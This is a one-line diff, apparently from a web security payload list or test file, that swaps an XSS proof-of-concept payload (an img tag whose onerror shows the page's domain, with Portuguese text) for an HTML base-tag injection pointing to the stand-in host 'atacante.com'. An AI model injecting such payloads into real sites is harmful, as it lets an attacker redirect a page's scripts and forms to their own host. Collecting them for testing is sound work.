@@ -1,1 +1,1 @@
-<img src=x onerror="alert('XSS em ' + document.domain)">
+<base href="https://atacante.com/">
